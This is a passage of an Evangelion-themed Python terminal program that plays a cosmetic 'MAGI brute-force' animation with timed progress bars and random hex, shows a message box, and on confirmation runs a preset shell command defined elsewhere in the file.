                msg('DENIED — brute-force? [ W ] wait  [ R ] retry', BR)
                time.sleep(0.8); typed.clear(); field()
                while True:
                    k2 = term.inkey(timeout=0.2)
                    if not k2: continue
                    c2 = kch(k2)
                    if c2 and c2.lower() == 'w': brute_force(); return
                    if c2 and c2.lower() == 'r': msg(); break
                    if is_esc(k2): sys.exit(0)
                continue
            if is_bs(k):
                if typed: typed.pop(); field()
                continue
            c = kch(k)
            if c and c.isalnum() and len(typed) < 5:
                typed.append(c.upper()); field()

# ============================================================
#  MAGI BRUTE-FORCE
# ============================================================
PHASES = [
    ('CASPAR    ─ INITIALISING',         0.00, 0.15),
    ('CASPAR    ─ DICTIONARY LAYER I',   0.15, 0.28),
    ('BALTHASAR ─ HASH EXPANSION',       0.28, 0.42),
    ('BALTHASAR ─ ENTROPY ANALYSIS',     0.42, 0.55),
    ('MELCHIOR  ─ NEURAL MATCH',         0.55, 0.68),
    ('MELCHIOR  ─ DEEP CIPHER',          0.68, 0.80),
    ('MAGI CORE ─ COLLATION',            0.80, 0.92),
    ('MAGI CORE ─ UNLOCKING…',           0.92, 1.00),
]
HEX = '0123456789ABCDEF'

def rnd_hex(w): return ' '.join(''.join(random.choices(HEX,k=4)) for _ in range(max(1,w//5)))
def pbar(p, w, cf=GN, ce=DI): f=int(w*p); return cf('█'*f)+ce('░'*max(0,w-f))

def brute_force():
    T = BRUTE_SECONDS; t0 = time.time()
    with term.fullscreen(), term.cbreak(), term.hidden_cursor():
        H, W = term.height, term.width
        fill(H, W)
        bw = min(W,70); bx=(W-bw)//2; by=1; bh=min(H-2,27)
        # static frame
        put(by,    bx, R(box_t(bw)))
        put(by+1,  bx, R('│')+BR('  MAGI ─ MANUAL DECRYPTION ENGAGED'.ljust(bw-2))+R('│'))
        put(by+2,  bx, R(box_s(bw)))
        put(by+3,  bx, R('│')+MU('  Authentication failed. Running brute-force recovery.'.ljust(bw-2))+R('│'))
        put(by+4,  bx, R(box_s(bw)))
        # rows 5-6 : overall bar
        put(by+7,  bx, R(box_s(bw)))
        # rows 8-9 : phase bar
        put(by+10, bx, R(box_s(bw)))
        # rows 11-16: hex stream
        put(by+17, bx, R(box_s(bw)))
        # rows 18-20: MAGI votes
        put(by+21, bx, R(box_s(bw)))
        # rows 22-23: countdown
        put(by+24, bx, R(box_s(bw)))
        put(by+25, bx, R('│')+MU('  ESC ─ abort'.ljust(bw-2))+R('│'))
        put(by+26, bx, R(box_b(bw)))
        bw2 = bw - 14
        hbuf = ['']*6; last=-1
        while True:
            k = term.inkey(timeout=0.15)
            if k and is_esc(k): sys.exit(0)
            now=time.time(); el=min(now-t0,T); pct=el/T; rem=max(0,T-el)
            sec=int(el)
            if sec==last: continue
            last=sec; mm,ss=divmod(int(rem),60)
            # overall
            put(by+5, bx, R('│')+MU('  OVERALL  ')+pbar(pct,bw2,AM,DI)+MU('  ')+R('│'))
            put(by+6, bx, R('│')+AM(f'  {pct*100:5.1f}%  ─  ETA {mm:02d}:{ss:02d}'.ljust(bw-2))+R('│'))
            # phase
            pl,pp=PHASES[-1][0],1.0
            for lb,p0,p1 in PHASES:
                if pct<=p1: pl=lb; pp=max(0.,min(1.,(pct-p0)/max(1e-4,p1-p0))); break
            put(by+8, bx, R('│')+CY(f'  {pl}'[:bw-2].ljust(bw-2))+R('│'))
            put(by+9, bx, R('│')+MU('  PHASE    ')+pbar(pp,bw2,CY,DI)+MU('  ')+R('│'))
            # hex
            hbuf=hbuf[1:]+[rnd_hex(bw-6)]
            for i,ln in enumerate(hbuf):
                put(by+11+i, bx, R('│')+(DI if i<4 else MU)(f'  {ln}'[:bw-2].ljust(bw-2))+R('│'))
            # votes
            def vstatus(thr, labels):
                col = BR if pct<thr[0] else AM if pct<thr[1] else GN
                lbl = labels[0] if pct<thr[0] else labels[1] if pct<thr[1] else labels[2]
                return col, lbl
            for i,(nm,thrs,lbs) in enumerate([
                ('CASPAR   ',  (0.33,0.50), ('ANALYZING  ','PATTERN FOUND','APPROVED')),
                ('BALTHASAR',  (0.50,0.75), ('COMPUTING  ','CONVERGING   ','APPROVED')),
                ('MELCHIOR ',  (0.72,0.95), ('DEEP SCAN  ','KEY MATCH    ','APPROVED')),
            ]):
                col,lbl = vstatus(thrs,lbs)
                put(by+18+i, bx, R('│')+col(f'  {nm}  ──  {lbl}'[:bw-2].ljust(bw-2))+R('│'))
            # clock
            tk = '▊' if sec%2==0 else '▉'
            put(by+22, bx, R('│')+YL(f'  {tk}  REMAINING  {mm:02d} min  {ss:02d} sec'.ljust(bw-2))+R('│'))
            tck=['SCANNING KEY SPACE…','TESTING PERMUTATIONS…','CROSS-REFERENCING DB…','MAGI CONSENSUS…','DECRYPTION ACTIVE…']
            put(by+23, bx, R('│')+MU(f'  {tck[sec%len(tck)]}'[:bw-2].ljust(bw-2))+R('│'))
            if pct>=1.0:
                put(by+22, bx, R('│')+GN('  DECRYPTION COMPLETE — ACCESS GRANTED'.ljust(bw-2))+R('│'))
                time.sleep(2.0); return

# ============================================================
#  MESSAGE BOX
# ============================================================
def message_box(msg):
    with term.fullscreen(), term.cbreak(), term.hidden_cursor():
        H, W = term.height, term.width
        fill(H, W)
        bw=min(max(60,W-12),90); iw=bw-6
        lines=wrap(msg,iw); vis=min(len(lines),max(4,H-10))
        lines=lines[:vis]; bh=vis+7
        bx=max(0,(W-bw)//2); by=max(1,(H-bh)//2)
        put(by,   bx, R(box_t(bw)))
        put(by+1, bx, R('│')+OR('  TERMINAL COMMUNIQUE'.ljust(bw-2))+R('│'))
        put(by+2, bx, R(box_s(bw)))
        for i,ln in enumerate(lines):
            put(by+3+i, bx, R('│')+'  '+WH(ln.center(iw))+'  '+R('│'))
        fr=by+3+vis
        put(fr,   bx, R(box_s(bw)))
        put(fr+1, bx, R('│')+AM('  ENTER ─ continue   ESC ─ abort'.ljust(bw-2))+R('│'))
        put(fr+2, bx, R(box_b(bw)))
        while True:
            k = term.inkey(timeout=0.1)
            if not k: continue
            if is_esc(k): return False
            if is_ret(k): return True

# ============================================================
#  FINAL PROMPT
# ============================================================
def final_prompt():
    with term.fullscreen(), term.cbreak(), term.hidden_cursor():
        H, W = term.height, term.width
        fill(H, W)
        bw=min(W,72); bh=10
        bx=(W-bw)//2; by=max(2,(H-bh)//2)
        put(by,   bx, R(box_t(bw)))
        put(by+1, bx, R('│')+OR('  FINAL AUTHORIZATION LAYER'.ljust(bw-2))+R('│'))
        put(by+2, bx, R(box_s(bw)))
        put(by+3, bx, R('│')+WH('  Press ENTER to execute the final payload.'.ljust(bw-2))+R('│'))
        put(by+4, bx, R(box_s(bw)))
        put(by+5, bx, R('│')+AM('  ENTER ─ execute'.ljust(bw-2))+R('│'))
        put(by+6, bx, R('│')+MU('  ESC   ─ abort'.ljust(bw-2))+R('│'))
        put(by+7, bx, R(box_s(bw)))
        put(by+8, bx, R('│')+DI(f'  {FINAL_CMD}'[:bw-2].ljust(bw-2))+R('│'))
        put(by+9, bx, R(box_b(bw)))
        while True:
            k = term.inkey(timeout=0.1)
            if not k: continue
            if is_esc(k): return False
            if is_ret(k): break
    print(term.clear)
    subprocess.run(['bash','-lc',FINAL_CMD], check=False)
    return True

# ============================================================
#  ENTRY POINT
# ============================================================
def main():
    try:
        splash()
        password_gate()
        message_box(LOREM)
        final_prompt()
    except KeyboardInterrupt:
        pass
    finally:
        sys.stdout.write(term.clear + term.normal)
        sys.stdout.write(R('\n  [ NERV ]  Session terminated.\n'))
        sys.stdout.flush()

if __name__ == '__main__':
    main()
